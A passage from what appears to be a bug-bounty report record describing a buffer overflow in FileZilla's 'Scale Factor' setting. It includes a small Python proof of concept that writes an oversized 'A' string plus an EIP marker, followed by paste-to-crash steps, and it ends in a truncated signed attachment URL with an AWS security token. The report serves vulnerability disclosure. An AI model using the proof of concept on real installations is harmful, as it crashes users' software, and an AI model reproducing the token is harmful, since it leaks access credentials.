_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nFileZilla in has a problem in the \"Scale Factor\" field is vulnerable to a Buffer Over Flow attack or a denial attack. Adding random characters in an entry that must accept only Float input type values.\n\n## Steps To Reproduce:\nA python file of name generatepaste.py was generated for the generation of the chain that allows the overflow, which is the following:\n\nbuffer = \"\\x41\" * 5000000\neip= \"\\x42\" * 4\nf = open (\"generate.txt\", \"w\")\nf.write(buffer+eip)\nf.close()\n\n  1.- Run python code : python generatepaste.py\n  2.- Open generate.txt and copy content to clipboard.\n  3.- Open FileZilla.\n  4.- Select the Edit menu and then Settings.\n  5.- Find the Interface section and select Themes.\n  6.- Paste Clipboard on \"Scale Factor\" three times.\n  7.- Click in the icons.\n  8.- BoF\n\n\n## Supporting Material/References:\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n  * [attachment / reference]\nF719632\n\n## Impact\n\nAn attacker can corrupt FileZilla applications and be a preamble to a much more severe attack.","bounty_amount":"250.0","formatted_bounty":"$250","weakness":{"id":3,"name":"Classic Buffer Overflow"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":719632,"file_name":"Captura.JPG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9P38hcCguipubRoYgTe4xy9r?response-content-disposition=attachment%3B%20filename%3D%22Captura.JPG%22%3B%20filename%2A%3DUTF-8%27%27Captura.JPG\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTFUDXKXM%2F20260429%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20260429T083934Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIFmcaZbu6EIMFNoKe3XWFWyvVm7HtoNGHN8NFFmhWpfkAiEA6x8mFvPcdqe4qDehoFYQLoIbk